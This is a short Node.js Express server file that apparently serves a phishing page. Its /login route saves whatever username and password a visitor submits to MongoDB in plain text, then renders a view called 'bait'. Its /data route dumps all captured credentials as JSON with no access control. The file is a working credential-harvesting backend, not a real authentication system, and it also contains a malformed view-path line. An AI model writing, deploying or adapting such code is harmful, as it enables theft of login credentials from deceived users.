const express = require('express');
const mongoose = require('mongoose');
const exphbs = require('express-handlebars');
const path = require('path');
const port = 3000;
const router = express.Router();
require('../database');
const Data = require('../database/schema/data');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, '../static')));
app.use('views', path.join(__dirname, '..views'));
app.engine('hbs', exphbs.engine({
    extname: 'hbs',
}));
app.set('view engine', 'hbs');

router.get('/', (req, res) => {
    res.render('home');
});

router.post('/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        if (!username || !password) throw new Error('Missing Credentials!');
        await Data.create({ username, password });
        res.render('bait');
    } catch (error) {
        console.log(error);
    }

});

router.get('/data', async (req, res) => {
    const userDataDB = await Data.find();
    res.json(userDataDB);
});

app.use('/', router);

app.listen(port, () => {
    console.log(`Live at http://localhost:${port}`);
});